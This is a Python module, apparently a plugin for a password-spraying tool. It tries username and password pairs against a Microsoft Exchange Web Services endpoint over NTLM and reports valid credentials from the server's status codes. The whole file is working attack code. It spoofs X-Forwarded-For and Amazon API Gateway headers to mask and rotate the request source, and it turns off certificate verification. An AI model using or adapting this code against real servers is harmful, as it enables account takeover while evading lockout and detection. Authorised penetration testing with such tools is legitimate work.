import requests
from requests_ntlm import HttpNtlmAuth
import utils.utils as utils
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def ews_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result' : None,    # Can be "success", "failure" or "potential"
        'error' : False,
        'output' : "",
        'valid_user' : False
    }

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
        'User-Agent' : useragent,
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id,

        "Content-Type" : "text/xml"
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:

        resp = requests.post(f"{url}/ews/", headers=headers, auth=HttpNtlmAuth(username, password), verify=False)

        if resp.status_code == 500:
            data_response['output'] = f"[*] POTENTIAL: Found credentials, but server returned 500: {username}:{password}"
            data_response['result'] = "potential"
            data_response['valid_user'] = True

        elif resp.status_code == 504:
            data_response['output'] = f"[*] POTENTIAL: Found credentials, but server returned 504: {username}:{password}"
            data_response['result'] = "potential"
            data_response['valid_user'] = True

        elif resp.status_code != 401:
            data_response['result'] = "success"
            data_response['output'] = f"[+] SUCCESS: {username}:{password}"
            data_response['valid_user'] = True

        else:
            data_response['result'] = "failure"
            data_response['output'] = f"[-] FAILURE: {username}:{password}"


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
